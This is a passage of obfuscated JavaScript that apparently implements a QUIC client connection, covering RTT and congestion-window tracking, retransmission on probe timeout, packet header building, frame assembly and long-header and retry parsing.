    [a0cm(0x934)]() {
        const iK = a0cm, a = {
                'ndrtA': function (b, c) {
                    return b * c;
                }
            };
        return Math['max'](a[iK(0x734)](this[iK(0xcab)], Math[iK(0x35e)](0x2, this[iK(0x893)])), 0x14);
    }
    [a0cm(0xcd9)](a) {
        const iL = a0cm, b = {
                'ZBCjt': function (c, d) {
                    return c === d;
                },
                'KTkMC': function (c, d) {
                    return c / d;
                },
                'fUXPv': function (c, d) {
                    return c / d;
                },
                'PuqKe': function (c, d) {
                    return c * d;
                },
                'RhtxB': function (c, d) {
                    return c + d;
                },
                'dIGxW': function (c, d) {
                    return c * d;
                },
                'TMENE': function (c, d) {
                    return c + d;
                }
            };
        b[iL(0xb6b)](this[iL(0x599)], null) ? (this[iL(0x599)] = a, this[iL(0x80e)] = b[iL(0x1bc)](a, 0x2)) : (this[iL(0x80e)] = b[iL(0xa24)](b['PuqKe'](this[iL(0x80e)], 0x3) + Math[iL(0x6d9)](this['srtt'] - a), 0x4), this[iL(0x599)] = b[iL(0xa24)](b[iL(0x670)](b[iL(0x7da)](this[iL(0x599)], 0x7), a), 0x8)), this[iL(0xcab)] = Math[iL(0x252)](b[iL(0x670)](b[iL(0xa41)](this[iL(0x599)], 0x4 * this['rttvar']), this[iL(0x4ec)]));
    }
    [a0cm(0x4fc)](a) {
        const iM = a0cm, b = {
                'AKQsY': function (c, d) {
                    return c + d;
                },
                'VLMRs': function (c, d) {
                    return c + d;
                },
                'aYkET': function (c, d) {
                    return c + d;
                },
                'yUjTx': function (c, d) {
                    return c + d;
                },
                'zaRMV': function (c, d) {
                    return c + d;
                },
                'dcgyR': iM(0xab6),
                'CCbLX': iM(0x887),
                'IUhXf': iM(0x48c),
                'zhZQd': iM(0x786),
                'aIdMF': function (c, d) {
                    return c === d;
                }
            };
        this['slowStartThreshold'] = Math['max'](Math[iM(0x19a)](this['congestionWindow'] / 0x2), 0x2 * this[iM(0x841)]), this[iM(0x7aa)] = this['minWindow'], this['log'][iM(0x3a5)](b['AKQsY'](b[iM(0x363)](b[iM(0x363)](b[iM(0x4d2)](b[iM(0x968)](b['zaRMV'](b['dcgyR'], a0bn[a]), b[iM(0x971)]), this[iM(0x7aa)]), b[iM(0x2f1)]), this[iM(0xbb4)]) + b[iM(0x38a)] + (b[iM(0x676)](this[iM(0x599)], null) ? '-' : Math['round'](this['srtt'])), 'ms'));
    }
    [a0cm(0x6b0)](a) {
        const iN = a0cm, b = {
                'pegFb': function (c, d) {
                    return c < d;
                },
                'dyjuT': function (c, d) {
                    return c - d;
                },
                'ckknL': function (c, d) {
                    return c + d;
                },
                'gSbKx': function (c, d) {
                    return c + d;
                },
                'ISmsN': function (c, d) {
                    return c + d;
                },
                'fFEJZ': 'quic\x20pto\x20epoch=',
                'fMxfU': iN(0x9ca),
                'Ixphu': function (c, d) {
                    return c > d;
                },
                'siBEL': function (c, d) {
                    return c + d;
                },
                'TKFPb': iN(0x585),
                'FZcPV': '\x20retransmits'
            };
        for (let c = 0x0; c < 0x3; c++) {
            const d = this[iN(0x13b)][c];
            if (!d[iN(0x55c)])
                continue;
            if (b[iN(0x108)](b[iN(0x762)](a, d[0x0][iN(0x8a1)]), this[iN(0x934)]()))
                continue;
            const f = d[0x0];
            this[iN(0x13b)][c] = d['slice'](0x1), this['_returnLost'](c, f), this[iN(0x60d)] += 0x1, this[iN(0x7d8)]['retransmits'] += 0x1, this[iN(0x893)] += 0x1, this[iN(0x305)][iN(0x3a5)](b[iN(0x6da)](b[iN(0x6da)](b[iN(0x6da)](b['gSbKx'](b[iN(0x8ad)](b[iN(0x528)], a0bn[c]) + iN(0x905) + f['pn'], iN(0xbc9)), this['inFlight'][c][iN(0x55c)]), b[iN(0x5c1)]), this['_ptoDuration']()));
            if (b['Ixphu'](this[iN(0x60d)], 0x18)) {
                this[iN(0x6a5)](b['ckknL'](b[iN(0x9e6)](b[iN(0xa3a)], this[iN(0x60d)]), b[iN(0x5f6)]));
                return;
            }
        }
    }
    [a0cm(0xc71)](a, b) {
        const iO = a0cm, c = {
                'SFjer': function (d, f) {
                    return d + f;
                }
            };
        b['crypto'] && this[iO(0x8f8)][a]['lossRanges']([b[iO(0x7c9)]]);
        for (const d of b[iO(0x907)]) {
            d[iO(0xa1a)][iO(0x77d)][iO(0x519)]([{
                    'start': d[iO(0xae2)],
                    'length': d['length']
                }]), d[iO(0xad1)] && d[iO(0xa1a)][iO(0x77d)][iO(0x519)]([{
                    'start': c[iO(0xd8f)](d[iO(0xae2)], d[iO(0x55c)]),
                    'length': 0x0,
                    'fin': !![]
                }]), this[iO(0x77c)](d['stream']);
        }
    }
    [a0cm(0xb00)]() {
        const iP = a0cm;
        this[iP(0x60d)] = 0x0, this[iP(0x893)] = 0x0;
    }
    ['_discardEpoch'](a, b) {
        const iQ = a0cm, c = {
                'gfJRR': function (d, f) {
                    return d + f;
                },
                'gAhAX': function (d, f) {
                    return d + f;
                },
                'Gbfak': iQ(0x124),
                'dRuFL': '\x20keys\x20('
            };
        if (this[iQ(0x40f)][a] === null)
            return;
        this['keys'][a] = null, this[iQ(0x13b)][a] = [], this[iQ(0x305)]['debug'](c[iQ(0x764)](c[iQ(0x223)](c[iQ(0x223)](c[iQ(0x45e)], a0bn[a]), c[iQ(0x2d8)]), b) + ')');
    }
    ['_flushHandshakeAck']() {
        const iR = a0cm, a = {
                'Xqtdg': function (k, l) {
                    return k(l);
                },
                'gRPsy': function (k, l) {
                    return k + l;
                },
                'vVoHE': function (k, l) {
                    return k === l;
                }
            }, b = a0bl, c = this[iR(0x40f)][b];
        if (c === null || !this[iR(0x6ca)][b] || this[iR(0x1ff)][b][iR(0x55c)] === 0x0)
            return;
        const d = a['Xqtdg'](a0bI, this['recvRanges'][b][iR(0x2d5)](-0x10));
        this['ackPending'][b] = ![];
        const f = this[iR(0x783)][b]++, g = this[iR(0xceb)](b, a['gRPsy'](a[iR(0x591)](a0bh, d[iR(0x55c)]), 0x10), f), h = Buffer[iR(0x5f9)]([
                g[iR(0x405)],
                g[iR(0x8b9)]
            ]), i = Buffer[iR(0x5f9)]([
                h,
                c[iR(0x77d)]['seal'](f, h, d)
            ]), j = a0bF(c['send'], i, g[iR(0x379)], g[iR(0x657)]);
        if (a[iR(0xaad)](j, null)) {
            this['ackPending'][b] = !![];
            return;
        }
        this[iR(0x641)]({
            'epoch': b,
            'packet': j,
            'pn': f,
            'meta': {
                'crypto': null,
                'streams': []
            },
            'ackEliciting': ![]
        });
    }
    [a0cm(0xcd5)]() {
        const iS = a0cm, a = { 'ZPbeE': 'handshake\x20confirmed' }, b = iS(0xbfb)[iS(0xb0c)]('|');
        let c = 0x0;
        while (!![]) {
            switch (b[c++]) {
            case '0':
                if (this[iS(0x176)] || !this[iS(0x4a7)] || !this[iS(0x403)])
                    return;
                continue;
            case '1':
                this['_discardEpoch'](a0bl, a['ZPbeE']);
                continue;
            case '2':
                this[iS(0x176)] = !![];
                continue;
            case '3':
                this[iS(0xba8)]();
                continue;
            case '4':
                this['_discardEpoch'](a0bk, a['ZPbeE']);
                continue;
            }
            break;
        }
    }
    [a0cm(0x1dc)](a) {
        const iT = a0cm, b = {
                'gbADs': function (d, f) {
                    return d === f;
                },
                'HINiP': function (d, f) {
                    return d + f;
                },
                'JuQQo': function (d, f) {
                    return d + f;
                },
                'yJjDm': function (d, f) {
                    return d === f;
                },
                'PwpJw': function (d, f) {
                    return d + f;
                },
                'BwsqQ': function (d, f) {
                    return d + f;
                },
                'kWZBR': function (d, f) {
                    return d + f;
                },
                'Keiwf': function (d, f) {
                    return d + f;
                },
                'dcOdX': function (d, f) {
                    return d + f;
                },
                'mrThF': function (d, f) {
                    return d + f;
                },
                'vAjMx': function (d, f) {
                    return d + f;
                },
                'PqLKJ': function (d, f) {
                    return d + f;
                },
                'EWTNj': function (d, f) {
                    return d + f;
                }
            }, c = 0x10;
        if (b[iT(0x9f1)](a, a0bm))
            return b[iT(0x327)](b[iT(0x327)](b[iT(0x5b5)](0x1, this['peerCid'][iT(0x55c)]), a0bh), c);
        if (b[iT(0xc3f)](a, a0bl))
            return b[iT(0x781)](b[iT(0xaa3)](b['HINiP'](b[iT(0x96b)](b[iT(0xa29)](b[iT(0x231)](b['kWZBR'](0x1, 0x4), 0x1), this[iT(0x2e2)][iT(0x55c)]), 0x1), this['ourCid'][iT(0x55c)]), 0x2), a0bh) + c;
        return b[iT(0x96b)](b[iT(0x69b)](b[iT(0x36d)](b[iT(0xd31)](b[iT(0x781)](b['EWTNj'](b[iT(0xd31)](b[iT(0x781)](0x1 + 0x4, 0x1), this[iT(0x2e2)][iT(0x55c)]), 0x1), this[iT(0x39b)][iT(0x55c)]) + a0bq(this[iT(0x44b)]['length']), this[iT(0x44b)][iT(0x55c)]), 0x2), a0bh), c);
    }
    ['_header'](a, b, c) {
        const iU = a0cm, d = {
                'nNBZt': function (k, l) {
                    return k >>> l;
                },
                'qnFhW': function (k, l) {
                    return k === l;
                },
                'jFgcp': function (k, l) {
                    return k | l;
                },
                'PEuTQ': function (k, l) {
                    return k - l;
                },
                'uPOHp': function (k, l) {
                    return k + l;
                },
                'YKVwV': function (k, l) {
                    return k === l;
                },
                'wmoof': function (k, l) {
                    return k | l;
                },
                'pdlMk': function (k, l) {
                    return k | l;
                },
                'adbHQ': function (k, l) {
                    return k === l;
                }
            }, f = new a0bt(), g = Buffer[iU(0x2d9)](a0bh);
        g[iU(0xcf6)](d[iU(0x615)](c, 0x0), 0x0);
        if (d[iU(0x86e)](a, a0bm))
            return f[iU(0x347)](d[iU(0x114)](d['jFgcp'](0x40, this['appKeyPhase'] << 0x2), d[iU(0x2ac)](a0bh, 0x1))), f[iU(0x6c9)](this['peerCid']), {
                'header': f[iU(0x177)](),
                'pnBytes': g,
                'pnOffset': d[iU(0xd02)](0x1, this[iU(0x2e2)][iU(0x55c)]),
                'long': ![]
            };
        const h = d[iU(0x78b)](a, a0bk) ? 0x0 : 0x2;
        f[iU(0x347)](d[iU(0x7d2)](d['pdlMk'](0xc0, h << 0x4), a0bh - 0x1)), f['u32'](a0bb), f[iU(0x347)](this[iU(0x2e2)][iU(0x55c)])[iU(0x6c9)](this['peerCid']);
        d[iU(0xb1e)](a, a0bk) ? (f[iU(0x347)](this['ourCid'][iU(0x55c)])['bytes'](this[iU(0x39b)]), f[iU(0x432)](this[iU(0x44b)]['length']), this[iU(0x44b)]['length'] && f[iU(0x6c9)](this['peerToken'])) : f[iU(0x347)](0x0)['bytes'](Buffer['alloc'](0x0));
        const i = Buffer[iU(0x2d9)](0x2);
        i[iU(0xa21)](0x4000 | b, 0x0), f[iU(0x6c9)](i);
        const j = f['build']();
        return {
            'header': j,
            'pnBytes': g,
            'pnOffset': j[iU(0x55c)],
            'long': !![]
        };
    }
    ['_pickEpoch']() {
        const iV = a0cm, a = {
                'NkzDc': function (b, c) {
                    return b === c;
                }
            };
        for (const b of [
                a0bk,
                a0bl,
                a0bm
            ]) {
            if (this['keys'][b] === null)
                continue;
            if (this[iV(0x6ca)][b] && this[iV(0x1ff)][b][iV(0x55c)])
                return b;
            if (this[iV(0xd08)](b)[iV(0x55c)])
                return b;
            if (this[iV(0x8f8)][b][iV(0x25b)]['length'])
                return b;
            if (a['NkzDc'](b, a0bm) && (this[iV(0xb66)]['length'] || this[iV(0x897)][iV(0x55c)] || this[iV(0x439)] || this['closing']))
                return b;
        }
        return -0x1;
    }
    ['_pendingOneOff'](a) {
        const iW = a0cm;
        return this[iW(0x7ed)][iW(0x88f)](b => b[iW(0x298)] === a);
    }
    [a0cm(0x3a3)]() {
        const iX = a0cm, a = {
                'fhqdm': function (o, p) {
                    return o < p;
                },
                'uQHbM': function (o, p) {
                    return o - p;
                },
                'CEpML': function (o, p) {
                    return o(p);
                },
                'GsDJF': function (o, p) {
                    return o > p;
                },
                'ldhWb': function (o, p) {
                    return o - p;
                },
                'Jhqty': function (o, p) {
                    return o > p;
                },
                'IlWXM': function (o, p) {
                    return o - p;
                },
                'yHcSN': function (o, p) {
                    return o === p;
                },
                'hCdLk': 'close',
                'vGGAn': iX(0x7d9),
                'EWMen': function (o, p) {
                    return o - p;
                },
                'JwtFT': function (o, p) {
                    return o > p;
                },
                'LBFSQ': function (o, p) {
                    return o + p;
                },
                'qjyis': function (o, p, q, r, s) {
                    return o(p, q, r, s);
                },
                'JfZbR': 'packet\x20too\x20small\x20for\x20header\x20protection\x20sample'
            }, b = this['_pickEpoch']();
        if (a[iX(0x75f)](b, 0x0))
            return null;
        let c = a[iX(0x33b)](this[iX(0x86a)], this[iX(0x1dc)](b));
        if (a[iX(0x75f)](c, 0x10))
            return null;
        const d = [], f = {
                'crypto': null,
                'streams': [],
                'ping': ![],
                'closing': ![],
                'oneOff': ![]
            };
        if (this[iX(0x6ca)][b] && this[iX(0x1ff)][b][iX(0x55c)]) {
            const o = a[iX(0xa72)](a0bI, this[iX(0x1ff)][b][iX(0x2d5)](-0x10));
            d[iX(0x1d5)](o), c -= o['length'], this['ackPending'][b] = ![];
        }
        for (const p of this[iX(0xd08)](b)) {
            if (a[iX(0x7c1)](p['frame'][iX(0x55c)], a[iX(0x13c)](c, 0x10)))
                break;
            d[iX(0x1d5)](p[iX(0x567)]), c -= p[iX(0x567)][iX(0x55c)], this[iX(0x7ed)][iX(0x8cd)](this[iX(0x7ed)][iX(0x1eb)](p), 0x1), f[iX(0x985)] = !![];
        }
        const g = this[iX(0x8f8)][b];
        if (g[iX(0x25b)][iX(0x55c)] && a[iX(0xd6d)](c, 0x10)) {
            const q = g[iX(0x772)](a[iX(0x24c)](c, 0xc)), r = new a0bt();
            r['byte'](a0bo[iX(0x7c9)])['varint'](q[iX(0xae2)])[iX(0x432)](q[iX(0x55c)])[iX(0x6c9)](q['bytes']);
            const s = r['build']();
            d['push'](s), c -= s['length'], f[iX(0x7c9)] = q;
        }
        b === a0bm && (this['_creditFrames'](d, f, c), this[iX(0xb80)](d, f, Math[iX(0x389)](c, this[iX(0x831)]() - this[iX(0xd3b)]())));
        if (a['yHcSN'](b, a0bm) && this[iX(0xbdb)]) {
            const t = new a0bt();
            t[iX(0x347)](a0bo[iX(0xb9e)])['varint'](0x0)['varint'](0x0)[iX(0x6c9)](Buffer['from'](this['closeReason'] || a[iX(0x1da)], a[iX(0x9e5)])['subarray'](0x0, 0x40)), d['push'](t[iX(0x177)]()), f[iX(0xbdb)] = !![];
        } else
            b === a0bm && this[iX(0x439)] && (d['push'](Buffer[iX(0x1e7)]([a0bo[iX(0x843)]])), this[iX(0x439)] = ![], f[iX(0x843)] = !![]);
        if (!d[iX(0x55c)])
            return null;
        let h = Buffer[iX(0x5f9)](d);
        if (b === a0bk && !this[iX(0x4a7)]) {
            const u = a[iX(0x13c)](a[iX(0x547)](a0bj, this[iX(0x1dc)](b)), h['length']);
            a['JwtFT'](u, 0x0) && (h = Buffer[iX(0x5f9)]([
                h,
                Buffer[iX(0x2d9)](u)
            ]));
        }
        const i = this['pnSend'][b]++, j = a[iX(0xd3c)](b, a0bm) ? this['appSendKeys'][this[iX(0x9c9)]] : this[iX(0x40f)][b][iX(0x77d)], k = this[iX(0xceb)](b, a[iX(0x90d)](a['LBFSQ'](a0bh, h[iX(0x55c)]), 0x10), i), l = Buffer[iX(0x5f9)]([
                k['header'],
                k[iX(0x8b9)]
            ]), m = Buffer[iX(0x5f9)]([
                l,
                j[iX(0x858)](i, l, h)
            ]), n = a['qjyis'](a0bF, j, m, k[iX(0x379)], k['long']);
        if (n === null)
            return this[iX(0x6a5)](a[iX(0x5d9)]), null;
        return {
            'epoch': b,
            'packet': n,
            'pn': i,
            'meta': f,
            'ackEliciting': a[iX(0xa72)](Boolean, f[iX(0x7c9)] || f[iX(0x907)][iX(0x55c)] || f[iX(0x843)] || f[iX(0xbdb)] || f[iX(0x985)]),
            'summary': this[iX(0x4f3)](d)
        };
    }
    [a0cm(0x4f3)](a) {
        const iY = a0cm, b = {
                'KggXD': function (d, f) {
                    return d === f;
                },
                'Locxs': 'ack',
                'godDA': function (d, f) {
                    return d === f;
                },
                'kdtSq': function (d, f) {
                    return d === f;
                },
                'gcpKb': iY(0x843),
                'KzJec': function (d, f) {
                    return d === f;
                },
                'laMFW': 'stream',
                'RmRRi': function (d, f) {
                    return d === f;
                },
                'NJSOS': 'max-data',
                'TbXuc': iY(0x69f),
                'KyJaV': function (d, f) {
                    return d + f;
                }
            }, c = [];
        for (const d of a) {
            const f = d[0x0];
            if (b[iY(0x878)](f, a0bo['ack']))
                c[iY(0x1d5)](b[iY(0xd35)]);
            else {
                if (b[iY(0x888)](f, a0bo[iY(0x7c9)]))
                    c['push'](iY(0x7c9));
                else {
                    if (b['kdtSq'](f, a0bo['ping']))
                        c[iY(0x1d5)](b[iY(0x7dd)]);
                    else {
                        if (b[iY(0x5d8)](f, a0bo[iY(0xa1a)]))
                            c[iY(0x1d5)](b[iY(0x694)]);
                        else {
                            if (b[iY(0xac1)](f, a0bo['maxData']))
                                c[iY(0x1d5)](b[iY(0xa37)]);
                            else {
                                if (b[iY(0xfa)](f, a0bo['maxStreamData']))
                                    c[iY(0x1d5)](iY(0xb12));
                                else
                                    b[iY(0x888)](f, a0bo[iY(0x7fe)]) ? c[iY(0x1d5)](b[iY(0xadb)]) : c[iY(0x1d5)](b[iY(0x138)]('0x', f[iY(0x7a0)](0x10)));
                            }
                        }
                    }
                }
            }
        }
        return c[iY(0x455)](',');
    }
    [a0cm(0x3f6)](a, b, c) {
        const iZ = a0cm, d = {
                'eUPEy': function (f, g) {
                    return f > g;
                },
                'rJVgA': function (f, g) {
                    return f - g;
                },
                'IYwPp': function (f, g) {
                    return f < g;
                }
            };
        if (this[iZ(0x535)] && d['eUPEy'](c, 0xc)) {
            const f = new a0bt();
            f[iZ(0x347)](a0bo['maxData'])[iZ(0x432)](this[iZ(0x265)]), a['push'](f[iZ(0x177)]()), this[iZ(0x535)] = ![], c -= a[d[iZ(0x97f)](a[iZ(0x55c)], 0x1)][iZ(0x55c)];
        }
        for (const g of this['creditReady'][iZ(0x2d5)]()) {
            if (d[iZ(0x419)](c, 0x14))
                break;
            const h = new a0bt();
            h[iZ(0x347)](a0bo[iZ(0x3ae)])[iZ(0x432)](g['id'])[iZ(0x432)](g['localLimit']);
            const i = h[iZ(0x177)]();
            a['push'](i), c -= i[iZ(0x55c)];
            const j = this[iZ(0x897)][iZ(0x1eb)](g);
            this[iZ(0x897)][iZ(0x8cd)](j, 0x1);
        }
    }
    [a0cm(0xbab)](a) {
        const j0 = a0cm, b = {
                'XZnfw': function (c, d) {
                    return c === d;
                },
                'atuDh': 'local'
            };
        if (a[j0(0xc8f)])
            return a['peerLimit'];
        return b[j0(0xcca)](a['initiator'], b[j0(0x4af)]) ? this[j0(0xb7e)] : this[j0(0x95d)];
    }
    [a0cm(0xb80)](a, b, c) {
        const j1 = a0cm, d = {
                'FTxmw': function (f, g) {
                    return f < g;
                },
                'ibcUf': function (f, g) {
                    return f - g;
                },
                'xRJTt': function (f, g) {
                    return f === g;
                },
                'wBdNJ': function (f, g) {
                    return f | g;
                },
                'aoFRL': function (f, g) {
                    return f | g;
                },
                'sSDMX': function (f, g) {
                    return f >= g;
                },
                'FRywY': function (f, g) {
                    return f | g;
                },
                'yopve': function (f, g) {
                    return f - g;
                },
                'gVDMG': function (f, g) {
                    return f + g;
                }
            };
        for (const f of this['sendReady'][j1(0x2d5)]()) {
            if (d['FTxmw'](c, 0x18))
                break;
            const g = Math[j1(0x389)](d[j1(0xd64)](this[j1(0x12d)], this[j1(0x541)]), this[j1(0xbab)](f) - f[j1(0x522)]);
            if (g <= 0x0)
                break;
            const h = f[j1(0x77d)][j1(0x772)](Math[j1(0x389)](c - 0x14, g));
            if (d[j1(0x136)](h, null)) {
                if (f[j1(0x77d)]['takeFin']()) {
                    const n = new a0bt();
                    n[j1(0x347)](d[j1(0x31e)](d[j1(0x366)](a0bo[j1(0xa1a)], 0x4) | 0x2, 0x1))[j1(0x432)](f['id'])[j1(0x432)](f[j1(0x77d)][j1(0x5f8)][j1(0x55c)])[j1(0x432)](0x0);
                    const o = n[j1(0x177)]();
                    a[j1(0x1d5)](o), c -= o[j1(0x55c)], b[j1(0x907)][j1(0x1d5)]({
                        'stream': f,
                        'start': f[j1(0x77d)][j1(0x5f8)]['length'],
                        'length': 0x0,
                        'fin': !![]
                    });
                } else
                    this['_dropSendReady'](f);
                continue;
            }
            const i = d[j1(0x867)](h[j1(0xae2)] + h[j1(0x55c)], f[j1(0x77d)]['data'][j1(0x55c)]), j = d[j1(0x73b)](0x4 | 0x2, i && f[j1(0x77d)]['fin'] ? 0x1 : 0x0), k = new a0bt();
            k[j1(0x347)](a0bo[j1(0xa1a)] | j)[j1(0x432)](f['id'])[j1(0x432)](h['start'])[j1(0x432)](h[j1(0x55c)])[j1(0x6c9)](h[j1(0x6c9)]);
            const l = k[j1(0x177)]();
            a[j1(0x1d5)](l), c -= l[j1(0x55c)], b['streams'][j1(0x1d5)]({
                'stream': f,
                'start': h[j1(0xae2)],
                'length': h[j1(0x55c)],
                'fin': i && f['send']['fin'],
                'retransmitted': h['retransmitted']
            });
            const m = Math[j1(0x60c)](0x0, d[j1(0x5ea)](d[j1(0x6c3)](h[j1(0xae2)], h[j1(0x55c)]), f[j1(0x522)]));
            f[j1(0x522)] = Math[j1(0x60c)](f['sentEnd'], d[j1(0x6c3)](h[j1(0xae2)], h['length'])), this[j1(0x541)] += m, f['send'][j1(0xb74)]() && this['_dropSendReady'](f);
        }
    }
    [a0cm(0x325)](a) {
        const j2 = a0cm, b = {
                'UPFPI': function (d, f) {
                    return d >= f;
                }
            }, c = this[j2(0xb66)][j2(0x1eb)](a);
        b[j2(0x42d)](c, 0x0) && this[j2(0xb66)][j2(0x8cd)](c, 0x1);
    }
    [a0cm(0x77c)](a) {
        const j3 = a0cm, b = {
                'iYmgc': function (c, d) {
                    return c < d;
                }
            };
        b[j3(0xad9)](this[j3(0xb66)][j3(0x1eb)](a), 0x0) && this['sendReady'][j3(0x1d5)](a);
    }
    ['openStream']() {
        const j4 = a0cm, a = { 'bTngZ': j4(0x4d9) }, b = new a0bQ(this, this[j4(0x4e1)], a[j4(0xa9f)]);
        return this[j4(0x4e1)] += 0x4, this[j4(0x907)][j4(0x689)](b['id'], b), b;
    }
    async [a0cm(0x8e1)](a, b, c) {
        const j5 = a0cm, d = {
                'LtRJk': function (g, h) {
                    return g === h;
                },
                'dCIkd': function (g, h) {
                    return g + h;
                },
                'VrxMy': j5(0x1b7)
            }, f = this[j5(0x907)][j5(0x81a)](a);
        if (d[j5(0xada)](f, undefined))
            throw new Error(d['dCIkd'](d[j5(0x576)], a));
        f['write'](b, c);
    }
    ['_transmit'](a) {
        const j6 = a0cm, b = {
                'uUvfu': function (c, d) {
                    return c + d;
                },
                'itdDe': j6(0x5b9),
                'aGxYB': function (c, d) {
                    return c === d;
                },
                'XSOBh': function (c, d) {
                    return c <= d;
                },
                'pcOqd': function (c, d) {
                    return c + d;
                },
                'SVWtG': '\x20hex=',
                'Tpdgv': 'hex',
                'DfmjP': function (c, d) {
                    return c + d;
                },
                'KWmkW': function (c, d) {
                    return c + d;
                },
                'gCdWa': function (c, d) {
                    return c + d;
                },
                'SSCXg': function (c, d) {
                    return c + d;
                },
                'frJUt': function (c, d) {
                    return c + d;
                },
                'MGiAj': 'tx\x20'
            };
        if (b[j6(0xf4)](this[j6(0xa05)], null) || this[j6(0x874)])
            return;
        this[j6(0xa05)]['send'](a[j6(0xd27)], 0x0, a['packet'][j6(0x55c)], this['port'], this['host'], c => {
            const j7 = j6;
            c && !this[j7(0x874)] && this[j7(0x305)]['debug'](b[j7(0x7bd)](b['itdDe'], c[j7(0xbe8)]));
        });
        if (process.env.KISAMA_QUIC_DEBUG && a['epoch'] === 0x1 && b[j6(0x4d7)](this[j6(0x7d8)]['tx'], 0x28))
            this['log']['warning'](b[j6(0x7bd)](b[j6(0xdb5)](b[j6(0x7bd)]('QUICDBG-HS\x20pn=', a['pn']), b[j6(0x520)]), a[j6(0xd27)]['toString'](b[j6(0x898)])));
        this['stats']['tx'] += 0x1, this[j6(0x7d8)][j6(0x4a2)] += a[j6(0xd27)]['length'];
        a[j6(0x298)] === a0bk && (this['initialSent'] += 0x1);
        a[j6(0x298)] === a0bl && this[j6(0x8f8)][a0bl]['pending']['length'] === 0x0 && (this[j6(0x403)] = !![]);
        this['log'][j6(0x3a5)](b[j6(0x41a)](b[j6(0x826)](b['uUvfu'](b[j6(0xaac)](b[j6(0x886)](b[j6(0x886)](b['frJUt'](b[j6(0xdb5)](b[j6(0x745)], a['packet']['length']), 'B\x20'), a0bn[a[j6(0x298)]]), j6(0x905)), a['pn']), '\x20['), a['summary']), ']'));
        if (a[j6(0x624)]) {
            const c = a['meta']['crypto'] !== null && b[j6(0xf4)](a['meta'][j6(0x7c9)][j6(0x3e6)], !![]) || a[j6(0x7ef)]['streams'][j6(0x758)](d => d['retransmitted'] === !![]);
            this['inFlight'][a[j6(0x298)]][j6(0x1d5)]({
                'pn': a['pn'],
                'time': Date['now'](),
                'bytes': a[j6(0xd27)][j6(0x55c)],
                'crypto': a['meta'][j6(0x7c9)],
                'streams': a[j6(0x7ef)][j6(0x907)],
                'retransmitted': c
            }), this[j6(0xa69)] = Date[j6(0x866)]();
        }
    }
    [a0cm(0x8ea)](a) {
        const j8 = a0cm, b = {
                'sffRu': function (d, f) {
                    return d < f;
                },
                'UAfzj': function (d, f) {
                    return d & f;
                },
                'qGuqL': function (d, f) {
                    return d === f;
                },
                'IzNfG': function (d, f) {
                    return d !== f;
                },
                'WKgUN': function (d, f) {
                    return d + f;
                }
            };
        this['stats']['rx'] += 0x1, this[j8(0x7d8)]['rxBytes'] += a['length'], this[j8(0x1dd)] = Date[j8(0x866)]();
        let c = 0x0;
        while (b[j8(0xa3c)](c, a[j8(0x55c)])) {
            const d = a[c];
            if (!b[j8(0x872)](d, 0x80)) {
                this[j8(0xaf1)](a[j8(0x262)](c));
                return;
            }
            const f = a[j8(0x262)](c), g = this['_parseLong'](f, 0x0);
            if (b[j8(0x7c4)](g, null))
                return;
            if (b[j8(0x8d2)](g[j8(0xa49)], a0bb)) {
                this[j8(0x305)][j8(0x3a5)](b[j8(0x109)](j8(0xb72), g[j8(0xa49)]['toString'](0x10)));
                return;
            }
            if (b[j8(0x7c4)](g[j8(0x483)], 0x3)) {
                this[j8(0x938)](g);
                return;
            }
            const h = Math[j8(0x389)](f['length'], g[j8(0x379)] + g[j8(0x55c)]);
            this[j8(0x500)](f['subarray'](0x0, h), g), c += h;
        }
    }
    [a0cm(0xccb)](a, b) {
        const j9 = a0cm, c = {
                'IzlSK': function (o, p) {
                    return o < p;
                },
                'yrFrX': function (o, p) {
                    return o - p;
                },
                'FbsPZ': function (o, p) {
                    return o & p;
                },
                'TmDkd': function (o, p) {
                    return o < p;
                },
                'mfyWf': function (o, p) {
                    return o + p;
                },
                'HQhwi': function (o, p) {
                    return o - p;
                },
                'Bnsxw': function (o, p, q) {
                    return o(p, q);
                },
                'PcDif': function (o, p) {
                    return o === p;
                },
                'hlHoc': function (o, p) {
                    return o(p);
                },
                'GlZGi': function (o, p) {
                    return o < p;
                },
                'upEVt': function (o, p) {
                    return o + p;
                },
                'TIMri': function (o, p) {
                    return o === p;
                },
                'UolkZ': function (o, p) {
                    return o - p;
                },
                'DFCyU': function (o, p, q) {
                    return o(p, q);
                },
                'dHGhl': function (o, p) {
                    return o(p);
                }
            };
        if (c['IzlSK'](c['yrFrX'](a['length'], b), 0x7))
            return null;
        const d = a[b], f = a[j9(0xbfa)](b + 0x1), g = c[j9(0x2d4)](d, 0x30) >> 0x4;
        let h = b + 0x5;
        const i = a[h];
        h += 0x1;
        if (c[j9(0x332)](a[j9(0x55c)] - h, i + 0x1))
            return null;
        const j = a['subarray'](h, c[j9(0xc83)](h, i));
        h += i;
        const k = a[h];
        h += 0x1;
        if (c[j9(0x332)](c['HQhwi'](a['length'], h), k))
            return null;
        const l = a[j9(0x262)](h, c[j9(0xc83)](h, k));
        h += k;
        let m = Buffer[j9(0x2d9)](0x0);
        if (g === 0x0) {
            const o = c['Bnsxw'](a0bs, a, h);
            if (c['PcDif'](o, null))
                return null;
            h += o[0x1];
            const p = c[j9(0x5c4)](Number, o[0x0]);
            if (c[j9(0xbed)](a[j9(0x55c)] - h, p))
                return null;
            m = a[j9(0x262)](h, c[j9(0x53e)](h, p)), h += p;
        }
        if (c[j9(0x91d)](g, 0x3))
            return {
                'first': d,
                'type': g,
                'version': f,
                'dcid': j,
                'scid': l,
                'token': a[j9(0x262)](h, c[j9(0x967)](a['length'], 0x10)),
                'pnOffset': 0x0,
                'length': 0x0,
                'retry': !![]
            };
        const n = c[j9(0x3d8)](a0bs, a, h);
        if (c['PcDif'](n, null))
            return null;
        return h += n[0x1], {
            'first': d,
            'type': g,
            'version': f,
            'dcid': j,
            'scid': l,
            'token': m,
            'pnOffset': h,
            'length': c['dHGhl'](Number, n[0x0]),
            'retry': ![]
        };
    }
    [a0cm(0x938)](a) {
        const ja = a0cm, b = {
                'GMmdL': function (f, g) {
                    return f + g;
                },
                'MPmYG': function (f, g) {
                    return f + g;
                },
                'tDBJK': 'rx\x20retry\x20token=',
                'HBENy': ja(0x696)
            }, c = ja(0xb75)['split']('|');
        let d = 0x0;
        while (!![]) {
            switch (c[d++]) {
            case '0':
                this[ja(0x8f8)][a0bk][ja(0xafd)]();
                continue;
            case '1':
                this[ja(0x783)][a0bk] = 0x0;
                continue;
            case '2':
                this[ja(0x2e2)] = Buffer[ja(0x1e7)](a[ja(0xc8e)]);
                continue;
            case '3':
                this[ja(0x13b)][a0bk] = [];
                continue;
            case '4':
